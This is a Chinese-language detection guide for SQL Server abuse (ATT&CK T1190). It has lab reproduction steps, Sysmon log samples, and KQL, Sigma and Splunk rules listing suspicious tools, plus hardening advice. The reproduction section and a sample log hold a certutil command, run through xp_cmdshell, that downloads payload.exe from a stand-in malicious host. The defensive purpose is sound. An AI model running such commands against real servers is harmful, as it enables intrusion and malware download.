# T1190-检测SQL Server滥用

## 描述

攻击者可能利用面向Internet的应用程序（如SQL Server数据库）的漏洞，通过软件、数据或命令引发意外或非预期行为，从而实现初始访问、权限提升或防御逃逸（T1190）。SQL Server作为常见的企业数据库服务，可能因配置错误、弱密码、未修补的漏洞或不安全的权限管理而成为攻击目标。攻击者可能通过SQL注入、凭据暴力破解或滥用SQL Server的合法功能（如执行系统命令）来实现恶意目的。

SQL Server提供了多种工具（如`xp_cmdshell`、`sqlcmd`）和功能，用于自动化任务、导出数据或运行脚本。攻击者可能重新利用这些合法工具执行恶意命令，如下载恶意软件、创建后门或进行网络侦察。在云化基础架构中，SQL Server的漏洞利用可能导致底层实例受损，允许攻击者访问云API或利用弱身份和访问管理策略。OWASP Top 10和CWE Top 25提供了常见的数据库和Web漏洞参考。

## 测试案例

1. **通过xp_cmdshell执行系统命令**  
   攻击者利用SQL Server的`xp_cmdshell`功能执行系统命令（如`whoami`或`netstat`），获取主机信息或建立持久化。

2. **凭据窃取**  
   攻击者通过SQL注入或弱凭据访问SQL Server，运行脚本导出用户凭据或数据库内容。

3. **异常工具调用**  
   攻击者利用SQL Server进程（如`sqlservr.exe`）启动可疑命令（如`certutil`下载恶意文件），进行恶意操作。

## 检测日志

**Windows安全日志和Sysmon日志**  
检测SQL Server滥用依赖以下日志来源：
- **Windows安全日志**：
  - 事件ID 4688：记录进程创建，包含命令行参数。
  - 事件ID 4624/4625：记录登录成功或失败，可能涉及SQL Server服务账户。
- **Sysmon日志**：
  - 事件ID 1：记录进程创建和命令行参数，适合检测SQL Server进程启动的可疑命令。
  - 事件ID 11：记录文件创建，可能涉及恶意文件下载。
- **SQL Server日志**：记录异常查询、错误消息或高危命令（如`xp_cmdshell`调用）。
- **网络日志**：记录SQL Server端口（默认1433）的异常流量。

## 测试复现

1. **环境准备**：
   - 部署SQL Server实例，启用`xp_cmdshell`（默认禁用）。
   - 配置Sysmon和Windows安全日志，记录进程创建（事件ID 4688、Sysmon ID 1）。
   - 示例SQL命令启用`xp_cmdshell`：
     ```sql
     EXEC sp_configure 'show advanced options', 1;
     RECONFIGURE;
     EXEC sp_configure 'xp_cmdshell', 1;
     RECONFIGURE;
     ```

2. **模拟攻击**：
   - 使用SQL Server账户执行系统命令。
   - 示例SQL命令（通过`xp_cmdshell`运行`whoami`）：
     ```sql
     EXEC xp_cmdshell 'whoami';
     ```
   - 模拟攻击者调用可疑工具：
     ```sql
     EXEC xp_cmdshell 'certutil -urlfetch -f http://malicious.com/payload.exe';
     ```

3. **验证日志**：
   - 检查Sysmon日志（事件ID 1）或Windows安全日志（事件ID 4688），确认`sqlservr.exe`等进程是否启动了可疑命令。
   - 检查SQL Server日志，验证是否记录`xp_cmdshell`调用。

**注意**：此复现仅用于学习和测试目的，需在合法授权的测试环境中进行，切勿用于非法活动。参考：<https://zhuanlan.zhihu.com/p/25254794>

## 测试留痕

SQL Server滥用可能在以下日志中留下痕迹：
- **Sysmon日志**：
  - 事件ID 1：记录`sqlservr.exe`、`sqlagent.exe`等进程启动可疑命令（如`certutil`、`whoami`）。
  - 示例日志：
    ```plaintext
    Process Create:
    Image: C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\sqlservr.exe
    CommandLine: certutil -urlfetch -f http://malicious.com/payload.exe
    ```
- **Windows安全日志**：
  - 事件ID 4688：记录进程创建和命令行参数。
- **SQL Server日志**：记录`xp_cmdshell`或其他高危命令的执行。
- **网络日志**：记录异常的SQL Server端口（1433）流量或文件下载请求。

## 检测规则/思路

**检测规则**  
通过分析Sysmon和Windows安全日志，检测SQL Server进程启动可疑命令的行为。以下是具体思路：

1. **日志分析**：
   - 收集Sysmon事件ID 1或Windows安全事件ID 4688，提取SQL Server相关进程（`sqlservr.exe`、`sqlagent.exe`、`sqlps.exe`、`launchpad.exe`）的命令行参数。
   - 检测可疑命令（如`certutil`、`whoami`）或高危工具调用。

2. **KQL规则（适用于Microsoft Defender或Azure Sentinel）**：
   ```kql
   DeviceProcessEvents
   | where Timestamp >= ago(10d)
   | where InitiatingProcessFileName in~ ("sqlservr.exe", "sqlagent.exe", "sqlps.exe", "launchpad.exe")
   | summarize tostring(makeset(ProcessCommandLine)) by DeviceId, bin(Timestamp, 2m)
   | where set_ProcessCommandLine has_any (
       "certutil", "netstat", "ping", "sysinfo", "systeminfo", "taskkill", "wget", "whoami",
       "Invoke-WebRequest", "Copy-Item", "WebClient", "advpack.dll", "appvlp.exe", "atbroker.exe",
       "bash.exe", "bginfo.exe", "bitsadmin.exe", "cdb.exe", "certutil.exe", "cl_invocation.ps1",
       "cl_mutexverifiers.ps1", "cmstp.exe", "csi.exe", "diskshadow.exe", "dnscmd.exe", "dnx.exe",
       "dxcap.exe", "esentutl.exe", "expand.exe", "extexport.exe", "extrac32.exe", "findstr.exe",
       "forfiles.exe", "ftp.exe", "gpscript.exe", "hh.exe", "ie4uinit.exe", "ieadvpack.dll",
       "ieaframe.dll", "ieexec.exe", "infdefaultinstall.exe", "installutil.exe", "makecab.exe",
       "manage-bde.wsf", "mavinject.exe", "mftrace.exe", "microsoft.workflow.compiler.exe",
       "mmc.exe", "msbuild.exe", "msconfig.exe", "msdeploy.exe", "msdt.exe", "mshta.exe",
       "mshtml.dll", "msiexec.exe", "msxsl.exe", "odbcconf.exe", "pcalua.exe", "pcwrun.exe",
       "pcwutl.dll", "pester.bat", "presentationhost.exe", "pubprn.vbs", "rcsi.exe", "regasm.exe",
       "register-cimprovider.exe", "regsvcs.exe", "regsvr32.exe", "replace.exe", "rundll32.exe",
       "runonce.exe", "runscripthelper.exe", "schtasks.exe", "scriptrunner.exe", "setupapi.dll",
       "shdocvw.dll", "shell32.dll", "slmgr.vbs", "sqltoolsps.exe", "syncappvpublishingserver.exe",
       "syncappvpublishingserver.vbs", "syssetup.dll", "te.exe", "tracker.exe", "url.dll",
       "verclsid.exe", "vsjitdebugger.exe", "wab.exe", "winrm.vbs", "wmic.exe", "xwizard.exe",
       "zipfldr.dll"
   )
   | sort by DeviceId, Timestamp asc
   ```

3. **Sigma规则**：
   ```yaml
   title: 检测SQL Server滥用可疑命令
   id: 7b8c9d0e-4f2a-4b1c-a9d3-2e1f3c4d5e6f
   status: experimental
   description: 检测SQL Server进程启动可疑命令，可能表明攻击者滥用合法工具
   date: 2025/06/06
   logsource:
     category: process_creation
     product: windows
   detection:
     selection:
       Image|endswith:
         - '\sqlservr.exe'
         - '\sqlagent.exe'
         - '\sqlps.exe'
         - '\launchpad.exe'
       CommandLine:
         - '*certutil*'
         - '*netstat*'
         - '*ping*'
         - '*sysinfo*'
         - '*systeminfo*'
         - '*taskkill*'
         - '*wget*'
         - '*whoami*'
         - '*Invoke-WebRequest*'
         - '*Copy-Item*'
         - '*WebClient*'
         - '*advpack.dll*'
         - '*appvlp.exe*'
         - '*atbroker.exe*'
         - '*bash.exe*'
         - '*bginfo.exe*'
         - '*bitsadmin.exe*'
         - '*cdb.exe*'
         - '*certutil.exe*'
         - '*cl_invocation.ps1*'
         - '*cl_mutexverifiers.ps1*'
         - '*cmstp.exe*'
         - '*csi.exe*'
         - '*diskshadow.exe*'
         - '*dnscmd.exe*'
         - '*dnx.exe*'
         - '*dxcap.exe*'
         - '*esentutl.exe*'
         - '*expand.exe*'
         - '*extexport.exe*'
         - '*extrac32.exe*'
         - '*findstr.exe*'
         - '*forfiles.exe*'
         - '*ftp.exe*'
         - '*gpscript.exe*'
         - '*hh.exe*'
         - '*ie4uinit.exe*'
         - '*ieadvpack.dll*'
         - '*ieaframe.dll*'
         - '*ieexec.exe*'
         - '*infdefaultinstall.exe*'
         - '*installutil.exe*'
         - '*makecab.exe*'
         - '*manage-bde.wsf*'
         - '*mavinject.exe*'
         - '*mftrace.exe*'
         - '*microsoft.workflow.compiler.exe*'
         - '*mmc.exe*'
         - '*msbuild.exe*'
         - '*msconfig.exe*'
         - '*msdeploy.exe*'
         - '*msdt.exe*'
         - '*mshta.exe*'
         - '*mshtml.dll*'
         - '*msiexec.exe*'
         - '*msxsl.exe*'
         - '*odbcconf.exe*'
         - '*pcalua.exe*'
         - '*pcwrun.exe*'
         - '*pcwutl.dll*'
         - '*pester.bat*'
         - '*presentationhost.exe*'
         - '*pubprn.vbs*'
         - '*rcsi.exe*'
         - '*regasm.exe*'
         - '*register-cimprovider.exe*'
         - '*regsvcs.exe*'
         - '*regsvr32.exe*'
         - '*replace.exe*'
         - '*rundll32.exe*'
         - '*runonce.exe*'
         - '*runscripthelper.exe*'
         - '*schtasks.exe*'
         - '*scriptrunner.exe*'
         - '*setupapi.dll*'
         - '*shdocvw.dll*'
         - '*shell32.dll*'
         - '*slmgr.vbs*'
         - '*sqltoolsps.exe*'
         - '*syncappvpublishingserver.exe*'
         - '*syncappvpublishingserver.vbs*'
         - '*syssetup.dll*'
         - '*te.exe*'
         - '*tracker.exe*'
         - '*url.dll*'
         - '*verclsid.exe*'
         - '*vsjitdebugger.exe*'
         - '*wab.exe*'
         - '*winrm.vbs*'
         - '*wmic.exe*'
         - '*xwizard.exe*'
         - '*zipfldr.dll*'
     condition: selection
   falsepositives:
     - 合法的SQL Server管理脚本或自动化任务
     - 开发或测试环境中的正常行为
   level: high
   ```

4. **SIEM规则**：
   - 检测SQL Server进程启动可疑命令。
   - 示例Splunk查询：
     ```spl
     source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image IN ("*\\sqlservr.exe", "*\\sqlagent.exe", "*\\sqlps.exe", "*\\launchpad.exe") (CommandLine="*certutil*" OR CommandLine="*netstat*" OR CommandLine="*whoami*" OR CommandLine="*wget*") | stats count by Image, CommandLine, ComputerName
     ```

5. **威胁情报整合**：
   - 检查可疑命令的网络目标（如`certutil`下载的URL）是否与已知恶意IP或域名相关，结合威胁情报平台（如VirusTotal、AlienVault）。

## 建议

### 缓解措施

防御SQL Server滥用需从配置加固、权限控制和监控入手：

1. **禁用高危功能**  
   - 禁用`xp_cmdshell`和`OLE Automation`等高危功能，除非必要。  
   - 示例SQL命令：
     ```sql
     EXEC sp_configure 'xp_cmdshell', 0;
     RECONFIGURE;
     ```

2. **最小权限原则**  
   - 配置SQL Server账户使用最低权限，限制对系统命令或敏感数据的访问。  
   - 确保服务账户无管理员权限。

3. **网络访问控制**  
   - 限制SQL Server端口（默认1433）的公网访问，仅允许白名单IP。  
   - 配置防火墙或WAF阻止异常SQL流量。

4. **定期漏洞扫描**  
   - 使用工具（如Nessus、SQLMap）定期扫描SQL Server漏洞。  
   - 及时更新SQL Server补丁，修复已知漏洞。

5. **日志和监控**  
   - 启用详细的SQL Server日志，记录高危命令（如`xp_cmdshell`）的执行。  
   - 配置Sysmon监控SQL Server进程行为。

### 检测

检测工作应集中在SQL Server进程的异常行为上，包括但不限于：  
- **进程行为监控**：分析Sysmon或Windows安全日志，检测SQL Server进程启动可疑命令（如`certutil`、`whoami`）。  
- **SQL查询监控**：检查SQL Server日志，识别高危命令或异常查询模式。  
- **网络流量分析**：监控SQL Server端口（1433）的异常流量或可疑文件下载。  
- **威胁情报整合**：结合威胁情报，检查可疑命令的目标URL或IP是否与已知恶意活动相关。

## 参考推荐

- MITRE ATT&CK: T1190  
  <https://attack.mitre.org/techniques/T1190/>  
- 如何通过SQL Server执行系统命令  
  <https://zhuanlan.zhihu.com/p/25254794>  
